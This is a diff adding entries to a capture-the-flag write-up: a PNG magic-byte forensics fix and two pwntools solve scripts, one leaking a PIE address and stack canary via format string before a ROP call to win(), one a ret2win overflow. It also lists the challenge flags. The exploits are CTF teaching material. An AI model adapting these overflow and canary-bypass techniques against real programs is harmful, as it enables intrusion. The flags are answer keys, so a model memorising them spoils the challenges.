@@ -20,6 +20,18 @@
 
 ## Forensics
 
+### Alluring Bytes
+
+>"Magic is alluring." ~ Grand Pabbie
+>
+>Buck, Chris, and Jennifer Lee. Frozen II. Walt Disney Studios Motion Pictures, 2019.
+>
+>Author: Jodie
+
+The trailing bytes show IEND, which is the trailing header for PNG files. The apparent JPG headers and file extension must be fixed, the first 16 bytes have been changed, so the entire 16 must be edited according to a PNG header. Example online hex editor is https://hexed.it/. Some people only fixed the first 8, this would still show the file as corrupted. PNG is a common file format in CTFs for magic byte related challs, with a PNG...IDHR header and IEND trailing header to indicate the end of file.
+
+Flag: `ACSI{w1th0ut_y0u_sh3_m4y_l05e_h3r5elf}`
+
 ### Exposed Credentials
 
 >We captured some network traffic of some chemistry fan.
@@ -299,8 +311,78 @@ payload = flat(
 p.sendline(payload)
 p.interactive()
 ```
+Alternate solution:
+```py
+from pwn import *
+context.log_level='debug'
+
+HOST = "alpha.8059blank.ml"
+PORT = 3002
+p = remote(HOST, PORT)
+BINARY = './formatstring'
+elf = context.binary = ELF(BINARY)
+#p = process(BINARY)
+
+p.sendlineafter("Let's leak the PIE offset first.\n", flat("%45$p"))
+pie_main = int(p.recvline(keepends=False),16)
+
+log.info(f"pie main at {hex(pie_main)}")
+log.info(f"main symbol at {hex(elf.sym.main)}")
+elf.address = pie_main - elf.sym.main
+log.success(f"pie at {hex(elf.address)}")
+
+p.sendlineafter("How about the canary?\n", flat("%39$p"))
+canary = int(p.recvline(keepends=False),16)
+log.success(f"canary is {hex(canary)}")
+
+rop = ROP(elf)
+p.sendlineafter("Now you've got everything you need!", flat(
+        b"A"*264,
+        canary,
+        b"A"*8,
+        rop.ret.address,
+        elf.sym.win
+))
+p.interactive()
+```
 
 Flag: `ACSI{h0p3_u_l1k3_1t_uwu_owo}`
+
+### Ret2Arendelle
+
+>Disaster strikes when Anna's hair turns white!
+>Guide Kristoff and Sven to the place of home,
+>Point him to where he ought to alight,
+>Make haste before the soul turns frigid.
+>
+>Author: Jodie
+
+Basic Ret2Win, offset 40, win() address given (arendelle) can be hardcoded. stack must be aligned with ret gadget for exploit `buffer + ret + arendelle`.
+
+Solve Script:
+
+```py
+from pwn import *
+context.log_level='debug'
+
+p = remote('alpha.8059blank.ml', 3001)
+elf = context.binary = ELF('./frozen')
+rop = ROP('./frozen')
+
+# given when program executes
+arendelle = 0x401216
+offset = 32 + 8 # rbp + 8, found in GDB
+
+p.sendlineafter("Many paths lie ahead, but which path will be the Return to Arendelle?\n", flat(
+        b"A"*offset,
+        rop.ret.address, # necessary to align the stack
+        arendelle
+))
+
+p.interactive()
+```
+
+Flag: `ACSI{w4rm_hug5}`
 
 ### RPS 2.0
 
